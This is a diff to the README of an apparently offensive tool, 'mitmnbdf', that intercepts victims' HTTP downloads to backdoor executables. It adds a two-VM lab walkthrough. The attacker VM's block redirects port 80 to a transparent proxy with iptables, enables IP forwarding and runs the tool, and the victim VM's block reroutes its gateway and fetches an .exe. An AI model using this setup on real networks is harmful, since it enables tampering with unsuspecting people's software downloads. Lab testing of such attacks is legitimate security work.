@@ -64,5 +64,54 @@ You need to initialise the `bdf` submodule, so:
 ## How to use
 Simply type `sudo python mitmnbdf.py`. Be sure to edit the config file and add your IP addresses and ports in the `[targets]` section.
 
+Of course, you have already mitm'd your victim(s) (use your favourite tool)
+To run a quick test, you can setup two VMs as follow:
+
+### VM A (mitmnbdf)
+```
+~$ ifconfig eth0
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:32:0e:37  
+          inet addr:192.168.8.129  Bcast:192.168.8.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe32:e37/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:466 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:430 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:282593 (282.5 KB)  TX bytes:356018 (356.0 KB)
+~$ route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         192.168.8.2     0.0.0.0         UG    0      0        0 eth0
+192.168.8.0     0.0.0.0         255.255.255.0   U     0      0        0 eth0
+
+~/mitmnbdf$ cat mitmnbdf.cfg | grep proxyPort
+proxyPort = 8080
+~/mitmnbdf$ cat mitmnbdf.cfg | grep proxyMode
+proxyMode = transparent  # <-- this is important!!!
+
+~$ sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+~$ sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+~/mitmnbdf$ sudo python mitmnbdf.py
+```
+
+### VM B (victim)
+
+```
+~$ ifconfig eth0
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:e1:a1:ed  
+          inet addr:192.168.8.135  Bcast:192.168.8.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fee1:a1ed/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:263 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:403 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:209801 (204.8 KiB)  TX bytes:31364 (30.6 KiB)
+
+~$ sudo route add default gw 192.168.8.129
+~$ sudo route del default gw 192.168.8.2
+~$ curl -O http://example.com/mysw.exe
+```
+
 ## WARNING
 This project uses `python-libarchive-c` (https://github.com/Changaco/python-libarchive-c) that is a wrapper for `libarchive` (https://github.com/libarchive/libarchive) which suffers from various bugs that could lead to a remote exploit. Use with care.
